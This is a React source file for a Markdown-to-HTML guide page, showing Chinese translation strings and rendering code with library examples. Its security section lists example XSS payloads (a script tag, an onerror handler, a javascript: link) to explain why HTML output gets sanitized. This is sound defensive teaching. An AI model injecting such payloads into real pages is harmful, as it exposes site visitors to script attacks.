    p_shiki: 'Shiki 使用 TextMate 语法和 VS Code 主题进行语法高亮，产生与 Visual Studio Code 中相同的精确着色。它在构建时运行，生成带内联样式的预高亮 HTML，因此不需要客户端 JavaScript。这使其非常适合静态站点生成器。Shiki 支持数百种语言和所有 VS Code 主题。',

    h2_ssg: '8. 静态站点生成器中的 Markdown',
    p_ssg_intro: '静态站点生成器在构建时将 Markdown 文件转换为 HTML 页面。每个框架处理 Markdown 的方式不同。',
    h3_nextjs: 'Next.js',
    p_nextjs: 'Next.js 通过多种方式支持 Markdown。你可以使用 next-mdx-remote 或 @next/mdx 获得 MDX 支持，允许在 Markdown 中使用 React 组件。对于标准 Markdown，可以使用 gray-matter 解析 frontmatter，结合 remark/rehype 进行 HTML 转换。Next.js 15+ 支持静态生成和服务器组件来处理 Markdown 内容。',
    h3_gatsby: 'Gatsby',
    p_gatsby: 'Gatsby 通过 gatsby-transformer-remark 内置 Markdown 支持，底层使用 remark。gatsby-remark-images、gatsby-remark-prismjs 和 gatsby-remark-autolink-headers 等插件扩展了处理管线。Gatsby 从 Markdown 文件创建 GraphQL 节点，使其可在组件中查询。',
    h3_hugo: 'Hugo',
    p_hugo: 'Hugo 使用 goldmark 作为默认 Markdown 渲染器，内置通过 Chroma 实现的语法高亮支持。Hugo 是最快的静态站点生成器，能在几秒内渲染数千个 Markdown 页面。它支持自定义短代码，用模板驱动的组件扩展 Markdown。',
    h3_jekyll: 'Jekyll',
    p_jekyll: 'Jekyll 是基于 Ruby 的静态站点生成器，驱动 GitHub Pages，使用 kramdown 作为默认 Markdown 渲染器。kramdown 支持 GFM、数学块、脚注和定义列表。Jekyll 处理带 YAML front matter 的 Markdown 文件，支持 Markdown 内容中的 Liquid 模板标签。',

    h2_extensions: '9. Markdown 扩展：数学公式、图表、脚注',
    p_extensions_intro: 'Markdown 扩展将语言扩展到基本文本格式之外，支持技术和学术内容。',
    h3_katex: '数学公式与 KaTeX',
    p_katex: 'KaTeX 是一个快速的数学排版库，将 LaTeX 表达式渲染为 HTML。在 Markdown 中通常使用美元符号分隔符：<code>$行内$</code> 用于行内数学，<code>$$块级$$</code> 用于显示数学。集成库包括 remark-math + rehype-katex（unified）、markdown-it-katex（markdown-it）以及用于客户端渲染的 katex auto-render。KaTeX 比 MathJax 快得多，输出质量高。',
    h3_mermaid: '图表与 Mermaid',
    p_mermaid: 'Mermaid 从 Markdown 代码块中的文本定义生成图表。它支持流程图、时序图、类图、状态图、实体关系图、甘特图等。GitHub 原生渲染 Markdown 文件中的 Mermaid 图表。在其他环境中可以使用 remark-mermaid 或通过 Mermaid JavaScript 库在客户端渲染图表。',
    h3_footnotes: '脚注',
    p_footnotes: '脚注让你在文档底部添加参考文献。语法使用带脱字号的方括号：<code>[^1]</code> 用于引用，<code>[^1]: 脚注文本</code> 用于定义。大多数 Markdown 处理器通过扩展支持脚注：remark-footnotes（remark）、markdown-it-footnote（markdown-it）和 Python-Markdown 的 footnotes 扩展。',

    h2_security: '10. 安全：消毒 HTML 输出（XSS 防护）',
    p_security_intro: '将 Markdown 转换为 HTML 引入了一个重大安全隐患：跨站脚本（XSS）。Markdown 允许内联 HTML，这意味着攻击者可以在 Markdown 内容中注入恶意脚本，这些脚本将被渲染为 HTML。',
    h3_xss_risks: 'Markdown 中的 XSS 风险',
    p_xss_risks: 'Markdown 设计上支持内联 HTML。这意味着 <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>、<code>&lt;img onerror="malicious()"&gt;</code> 和 <code>&lt;a href="javascript:..."&gt;</code> 等内容都可以嵌入 Markdown 并传递到 HTML 输出。如果你不经消毒就渲染用户提交的 Markdown，你就容易受到 XSS 攻击。',
    h3_dompurify: 'DOMPurify',
    p_dompurify: 'DOMPurify 是 JavaScript 中 HTML 消毒的黄金标准。它移除所有危险 HTML 同时保留安全内容。在将 Markdown 转换为 HTML 后使用它：先用你选择的库将 Markdown 解析为 HTML，然后通过 DOMPurify.sanitize() 处理 HTML。DOMPurify 在浏览器和 Node.js 环境中都可工作（通过 jsdom 或 isomorphic-dompurify 包）。',
    h3_rehype_sanitize: 'rehype-sanitize',
    p_rehype_sanitize: '如果你使用 unified/rehype 管线，rehype-sanitize 可直接集成到处理链中。它在 HTML AST 上操作，在序列化前移除危险节点。你可以使用默认的 GitHub 模式或定义自定义的标签、属性和协议允许列表。',
    h3_best_practices: '安全最佳实践',
    p_best_practices: '始终对 Markdown 生成的 HTML 进行消毒，尤其是用户提交的内容。尽可能在 Markdown 解析器中禁用内联 HTML（大多数解析器都有此选项）。使用内容安全策略（CSP）头作为额外的防御层。在 React 中绝不要不经消毒就使用 <code>dangerouslySetInnerHTML</code>。对于服务端渲染的内容，在发送 HTML 到客户端之前在服务端消毒。',

    h2_docs: '11. 文档系统中的 Markdown',
    p_docs_intro: '现代文档平台建立在 Markdown 之上，每个平台都添加了自己的扩展和约定。',
    h3_docusaurus: 'Docusaurus',
    p_docusaurus: 'Docusaurus（由 Meta 开发）使用 MDX 作为 Markdown 引擎，允许在文档页面中使用 React 组件。它提供内置的版本管理、搜索（Algolia）、国际化、提示框（note、tip、warning、danger）、选项卡、代码块功能（标题、行高亮、实时编辑器）和从文件系统自动生成侧边栏。',
    h3_mkdocs: 'MkDocs',
    p_mkdocs: 'MkDocs 是一个基于 Python 的文档生成器，使用 Python-Markdown。结合 Material for MkDocs 主题和 PyMdown Extensions，它提供丰富的功能：提示框、选项卡内容、代码注释、图表和社交卡片。配置通过单个 <code>mkdocs.yml</code> 文件完成。',
    h3_mintlify: 'Mintlify',
    p_mintlify: 'Mintlify 是一个使用 MDX 的现代文档平台。它提供精美的默认样式、从 OpenAPI 规范生成 API 文档、内置分析、自定义组件（手风琴、卡片、选项卡、代码组）和自动部署。它在面向开发者的 API 文档中很受欢迎。',

    h2_performance: '12. 性能：增量解析和缓存',
    p_performance_intro: '处理大量 Markdown 内容时，性能变得至关重要。以下是优化 Markdown 到 HTML 转换的策略。',
    h3_incremental: '增量解析',
    p_incremental: '增量解析不是在每次更改时重新解析整个文档，而只是更新受影响的部分。这对用户持续输入的实时预览编辑器尤其重要。CodeMirror 等库使用增量解析来保持大型 Markdown 文档的响应式编辑。',
    h3_caching: '构建时缓存',
    p_caching: '静态站点生成器应缓存解析后的 Markdown 输出以避免冗余处理。Next.js 使用 ISR（增量静态再生）来缓存渲染页面。Hugo 为未更改的内容维护构建缓存。对于自定义管线，实现内容寻址缓存：对 Markdown 源进行哈希并在解析前检查现有输出。',
    h3_streaming: '流式和懒渲染',
    p_streaming: '对于大型文档，考虑流式输出 HTML 或懒渲染各部分。Next.js 中的 React 服务器组件可以逐段流式传输 Markdown 内容。对于长文档页面，使用 Intersection Observer API 配合动态导入来懒加载首屏以下的部分。',

    h2_faq: '常见问题',
    faq1_q: '将 Markdown 转换为 HTML 的最佳 JavaScript 库是什么？',
    faq1_a: '取决于你的使用场景。marked 是最快最简单的基础转换方案。remark（unified）通过插件生态系统提供最强的可扩展性。markdown-it 在速度和功能之间提供了良好平衡，且符合 CommonMark。对于 MDX（Markdown + React 组件），使用 @mdx-js/mdx。',
    faq2_q: '渲染 Markdown 为 HTML 时如何防止 XSS 攻击？',
    faq2_a: '在将 Markdown 转换后始终对 HTML 输出进行消毒。客户端使用 DOMPurify，unified/rehype 管线使用 rehype-sanitize，Python 使用 bleach。此外，尽可能在 Markdown 解析器中禁用原始 HTML，并实施内容安全策略（CSP）头。',
    faq3_q: 'CommonMark、GFM 和 MDX 有什么区别？',
    faq3_a: 'CommonMark 是标准 Markdown 的严格规范，解决了原始规范中的歧义。GFM（GitHub 风格 Markdown）在 CommonMark 基础上扩展了表格、任务列表、删除线、自动链接和警告提示。MDX 在 Markdown 基础上扩展了 JSX 组件支持，允许你直接在 Markdown 文件中使用 React 组件。',
    faq4_q: '如何为 Markdown 代码块添加语法高亮？',
    faq4_a: '在三个反引号后指定语言（如 ```javascript）。然后使用语法高亮库：highlight.js 支持广泛语言，Prism 提供轻量级模块化高亮，Shiki 在构建时提供 VS Code 级别的高亮。集成方式取决于你的 Markdown 解析器和管线。',
    faq5_q: '可以在 React 和 Next.js 中使用 Markdown 吗？',
    faq5_a: '可以。Next.js 通过 @next/mdx 支持 MDX 文件，通过 next-mdx-remote 支持远程 MDX 内容，或使用 gray-matter（frontmatter）和 remark/rehype（转换）的自定义管线。MDX 是最受欢迎的选择，因为它允许直接在 Markdown 内容中嵌入 React 组件。',
    faq6_q: '将 Markdown 转换为 HTML 的最快方式是什么？',
    faq6_a: '在 JavaScript 中，marked 是最快的纯 JavaScript 解析器。在 Go 中，goldmark（Hugo 使用）提供卓越的性能。对于构建时转换，在构建步骤中预处理 Markdown 并缓存输出。避免在生产环境中在请求时解析 Markdown；改用静态生成或增量静态再生。',
    faq7_q: '如何在 Markdown 中渲染数学公式？',
    faq7_a: '使用 KaTeX 或 MathJax 渲染 LaTeX 数学表达式。在 Markdown 中，用单个美元符号包裹行内数学（$E = mc^2$），用双美元符号包裹块级数学。通过 remark-math 和 rehype-katex 集成 unified 管线，或使用 markdown-it-katex 集成 markdown-it。大多数情况下推荐 KaTeX，因为它比 MathJax 快。',
    faq8_q: 'Markdown 适合大规模文档吗？',
    faq8_a: '适合。GitHub、Meta（Docusaurus）、Google（各种项目）和 Stripe（Mintlify）等公司都使用 Markdown 进行文档编写。对于大规模文档，使用提供版本管理、搜索、导航和国际化的文档框架（Docusaurus、MkDocs、Mintlify）。结合基于 Git 的工作流进行协作和审查。',

    conclusion: '在 2026 年，Markdown 仍然是开发者内容的通用语言。无论你是构建文档站点、博客平台还是内容管理系统，理解 Markdown 如何转换为 HTML，以及如何安全且高效地完成转换，都是一项必备的开发者技能。试用我们的免费在线 Markdown 预览工具，亲身体验转换过程。',
  },
};

export default function MarkdownToHtmlOnlineGuide({ lang }: { lang: string }) {
  const t = translations[lang] || translations['en'];

  const faqSchema = {
    '@context': 'https://schema.org',
    '@type': 'FAQPage',
    mainEntity: [
      { '@type': 'Question', name: t.faq1_q, acceptedAnswer: { '@type': 'Answer', text: t.faq1_a } },
      { '@type': 'Question', name: t.faq2_q, acceptedAnswer: { '@type': 'Answer', text: t.faq2_a } },
      { '@type': 'Question', name: t.faq3_q, acceptedAnswer: { '@type': 'Answer', text: t.faq3_a } },
      { '@type': 'Question', name: t.faq4_q, acceptedAnswer: { '@type': 'Answer', text: t.faq4_a } },
      { '@type': 'Question', name: t.faq5_q, acceptedAnswer: { '@type': 'Answer', text: t.faq5_a } },
      { '@type': 'Question', name: t.faq6_q, acceptedAnswer: { '@type': 'Answer', text: t.faq6_a } },
      { '@type': 'Question', name: t.faq7_q, acceptedAnswer: { '@type': 'Answer', text: t.faq7_a } },
      { '@type': 'Question', name: t.faq8_q, acceptedAnswer: { '@type': 'Answer', text: t.faq8_a } },
    ],
  };

  return (
    <article style={{ maxWidth: 820, margin: '0 auto', padding: '0 16px' }}>
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema) }}
      />

      {/* TL;DR Box */}
      <div style={{ background: '#f0f9ff', border: '1px solid #bae6fd', borderRadius: 8, padding: '16px 20px', marginBottom: 28 }}>
        <strong style={{ fontSize: 16 }}>{t.tldr}</strong>
        <p style={{ margin: '8px 0 0', fontSize: 15, lineHeight: 1.7 }} dangerouslySetInnerHTML={{ __html: t.tldrText }} />
      </div>

      {/* Key Takeaways Box */}
      <div style={{ background: '#f8fafc', borderRadius: 8, padding: '16px 20px', marginBottom: 32 }}>
        <strong style={{ fontSize: 16 }}>{t.keyTakeaways}</strong>
        <ul style={{ margin: '10px 0 0', paddingLeft: 20, lineHeight: 1.8, fontSize: 15 }}>
          <li>{t.kt1}</li>
          <li>{t.kt2}</li>
          <li>{t.kt3}</li>
          <li>{t.kt4}</li>
          <li>{t.kt5}</li>
          <li>{t.kt6}</li>
          <li>{t.kt7}</li>
        </ul>
      </div>

      {/* CTA: Try the Tool */}
      <div style={{ background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)', borderRadius: 8, padding: '20px 24px', marginBottom: 32, color: '#fff' }}>
        <strong style={{ fontSize: 18 }}>{t.tryTool}</strong>
        <p style={{ margin: '6px 0 12px', fontSize: 14, opacity: 0.92 }}>{t.tryToolDesc}</p>
        <Link
          href={`/${lang}/tools/markdown-preview`}
          style={{ display: 'inline-block', background: '#fff', color: '#764ba2', fontWeight: 700, padding: '10px 24px', borderRadius: 6, textDecoration: 'none', fontSize: 15 }}
        >
          Markdown Preview Tool &rarr;
        </Link>
      </div>

      {/* Section 1: What is Markdown */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_what }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_what_1 }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_what_2 }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_what_3 }} />

      {/* Example: Basic Markdown to HTML */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '16px 20px', marginBottom: 24, overflowX: 'auto' }}>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8 }}>Markdown Input:</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`# Hello World
This is **bold** and *italic* text.
- Item one
- Item two
[Visit DevToolBox](https://viadreams.cc)`}
        </pre>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8, marginTop: 16 }}>HTML Output:</div>
        <pre style={{ color: '#ce9178', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`<h1>Hello World</h1>
<p>This is <strong>bold</strong> and <em>italic</em> text.</p>
<ul>
  <li>Item one</li>
  <li>Item two</li>
</ul>
<p><a href="https://viadreams.cc">Visit DevToolBox</a></p>`}
        </pre>
      </div>

      {/* Section 2: Syntax Reference */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_syntax }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_syntax_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_headings}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_headings }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`# Heading 1       -> <h1>
## Heading 2      -> <h2>
### Heading 3     -> <h3>
#### Heading 4    -> <h4>
##### Heading 5   -> <h5>
###### Heading 6  -> <h6>`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_emphasis}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_emphasis }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_lists}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_lists }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_links}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_links }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_code}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_code }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_tables}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_tables }} />

      {/* Tables Example */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`| Library     | Language   | Speed   | CommonMark |
|:------------|:----------:|--------:|-----------:|
| marked      | JavaScript | Fast    | Partial    |
| remark      | JavaScript | Medium  | Yes        |
| markdown-it | JavaScript | Fast    | Yes        |
| goldmark    | Go         | V.Fast  | Yes        |`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_blockquotes}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_blockquotes }} />

      {/* Section 3: Markdown Flavors */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_flavors }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_flavors_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_commonmark}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_commonmark }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_gfm}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_gfm }} />

      {/* GFM Example */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8 }}>GFM Extensions:</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`- [x] Task completed
- [ ] Task pending
~~strikethrough text~~
https://auto-linked-url.com

> [!NOTE]
> This is a GitHub alert callout.

> [!WARNING]
> This is a warning callout.`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_mdx}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_mdx }} />

      {/* MDX Example */}
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <div style={{ color: '#9cdcfe', fontSize: 13, marginBottom: 8 }}>MDX Example:</div>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { Chart } from './components/Chart'
import { Callout } from './components/Callout'

# Analytics Dashboard

Here is a live chart component:

<Chart data={salesData} type="bar" />

<Callout type="info">
  MDX lets you mix Markdown with React components.
</Callout>`}
        </pre>
      </div>

      {/* Section 4: JavaScript */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_js }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_js_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_marked}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_marked }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { marked } from 'marked';

// Basic conversion
const html = marked.parse('# Hello\\n**Bold** text');

// With options
marked.setOptions({
  gfm: true,
  breaks: true,
  highlight: function(code, lang) {
    return hljs.highlightAuto(code).value;
  }
});`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_remark}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_remark }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeStringify from 'rehype-stringify';

const result = await unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype)
  .use(rehypeStringify)
  .process('# Hello **world**');

console.log(String(result));
// <h1>Hello <strong>world</strong></h1>`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_markdownit}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_markdownit }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import MarkdownIt from 'markdown-it';
import footnote from 'markdown-it-footnote';
import attrs from 'markdown-it-attrs';

const md = new MarkdownIt({ html: false, linkify: true })
  .use(footnote)
  .use(attrs);

const html = md.render('# Hello [^1]\\n\\n[^1]: A footnote');`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_unified}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_unified }} />

      {/* Comparison Table */}
      <div style={{ overflowX: 'auto', marginBottom: 28 }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 14 }}>
          <thead>
            <tr style={{ background: '#f1f5f9' }}>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Library</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Bundle Size</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>CommonMark</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Extensibility</th>
              <th style={{ padding: '10px 14px', textAlign: 'left', borderBottom: '2px solid #e2e8f0' }}>Best For</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>marked</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>~35 KB</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Partial</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Custom renderers</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Speed, simplicity</td>
            </tr>
            <tr style={{ background: '#f8fafc' }}>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>remark</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>~100 KB+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Yes</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Plugin ecosystem</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Complex pipelines</td>
            </tr>
            <tr>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>markdown-it</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>~50 KB</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Yes</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Token-based plugins</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Balance of speed/features</td>
            </tr>
            <tr style={{ background: '#f8fafc' }}>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0', fontWeight: 600 }}>@mdx-js/mdx</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>~150 KB+</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>Yes</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>JSX components</td>
              <td style={{ padding: '10px 14px', borderBottom: '1px solid #e2e8f0' }}>React + Markdown</td>
            </tr>
          </tbody>
        </table>
      </div>

      {/* Section 5: Python */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_python }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_python_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_python_markdown}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_python_markdown }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import markdown

# Basic conversion
html = markdown.markdown('# Hello **world**')

# With extensions
html = markdown.markdown(
    text,
    extensions=[
        'tables',
        'fenced_code',
        'footnotes',
        'toc',
        'codehilite',
    ]
)`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_mistune}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_mistune }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`import mistune

# Basic usage
html = mistune.html('# Hello **world**')

# With plugins
from mistune import create_markdown
from mistune.plugins.table import table
from mistune.plugins.footnotes import footnotes

md = create_markdown(plugins=[table, footnotes])
html = md('| A | B |\\n|---|---|\\n| 1 | 2 |')`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_python_md_extensions}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_python_md_extensions }} />

      {/* Section 6: Go */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_go }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_go_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_goldmark}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_goldmark }} />
      <div style={{ background: '#1e1e1e', borderRadius: 8, padding: '14px 18px', marginBottom: 20, overflowX: 'auto' }}>
        <pre style={{ color: '#d4d4d4', fontSize: 13, lineHeight: 1.6, margin: 0 }}>
{`package main

import (
    "bytes"
    "github.com/yuin/goldmark"
    "github.com/yuin/goldmark/extension"
)

func main() {
    md := goldmark.New(
        goldmark.WithExtensions(
            extension.GFM,
            extension.Footnote,
        ),
    )
    var buf bytes.Buffer
    source := []byte("# Hello **world**")
    md.Convert(source, &buf)
    // buf.String() => "<h1>Hello <strong>world</strong></h1>"
}`}
        </pre>
      </div>

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_blackfriday}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_blackfriday }} />

      {/* Section 7: Syntax Highlighting */}
      <h2 style={{ fontSize: 24, fontWeight: 700, marginTop: 40, marginBottom: 12 }} dangerouslySetInnerHTML={{ __html: t.h2_highlight }} />
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_highlight_intro }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_highlightjs}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_highlightjs }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_prism}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 14, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_prism }} />

      <h3 style={{ fontSize: 18, fontWeight: 600, marginTop: 24, marginBottom: 8 }}>{t.h3_shiki}</h3>
      <p style={{ lineHeight: 1.8, marginBottom: 10, fontSize: 15 }} dangerouslySetInnerHTML={{ __html: t.p_shiki }} />

